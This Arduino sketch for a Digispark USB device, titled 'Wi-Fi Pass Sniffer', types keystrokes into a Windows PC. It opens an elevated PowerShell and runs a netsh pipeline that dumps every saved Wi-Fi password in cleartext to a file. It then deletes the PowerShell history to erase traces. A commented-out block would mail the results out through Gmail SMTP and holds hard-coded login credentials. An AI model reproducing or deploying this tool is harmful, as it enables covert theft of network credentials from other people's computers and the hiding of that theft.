//
//__          ___        ______ _    _____                   _____       _  __  __          
//\ \        / (_)      |  ____(_)  |  __ \ ____            / ____|     (_)/ _|/ _|         
// \ \  /\  / / _ ______| |__   _   | |__) / __ \ ___ ___  | (___  _ __  _| |_| |_ ___ _ __ 
//  \ \/  \/ / | |______|  __| | |  |  ___/ / _` / __/ __|  \___ \| '_ \| |  _|  _/ _ \ '__|
//   \  /\  /  | |      | |    | |  | |  | | (_| \__ \__ \  ____) | | | | | | | ||  __/ |   
//    \/  \/   |_|      |_|    |_|  |_|   \ \__,_|___/___/ |_____/|_| |_|_|_| |_| \___|_|   
//                                         \____/                                           @75u2u
//                                                                                          

#include "DigiKeyboard.h"
#define KEY_ESCAPE 0x29    //EscキーのIDを定義しています
#define KEY_TAB 0x2B       //Tabキー
#define KEY_ZENHAN 0x35    //全角半角キー

/*
ルール：
\(円マーク)は二回連続入力で(\\)有効
*/

void setup() {
}

void loop() {
  
  // セットアップ
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);

  // wi-fi profiles からパスを抜き出す
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(F("chcp 437"));  // [!] 英語表記(主要なコンテンツ->Key Contentすることで日本語入力できないdigikeyboard上でselect-stringを実行可能にするため(半角全角使っても可))
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  //DigiKeyboard.print(F("(netsh wlan show profiles) | Select-String '\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profiles name=$name key=clear)} | Select-String '主要なコンテンツ\W+\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize > $env:userprofile\\wifipass.txt"));
  DigiKeyboard.print(F("(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profiles name=$name key=clear)} | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize > $env:userprofile\\wifipass.txt"));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  //DigiKeyboard.print(F("exit"));
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  /*
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('75u2uuy4', 'crane_Tyuya_1999'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'SENDER_MAIL'; $ReportEmail.To.Add('RECEIVER_MAIL'); $ReportEmail.Subject = 'DigiSpark Report'; $ReportEmail.Body = 'Attached is your report. - Regards Your Digispark'; $ReportEmail.Attachments.Add('temp.txt'); $SMTPInfo.Send($ReportEmail)"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  DigiKeyboard.print(F("exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  */

  // リポジトリ削除(ログ消し)
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("del (Get-PSReadlineOption).HistorySavePath;exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  
  /*
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("del temp.txt"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  */
  for(;;){}
}
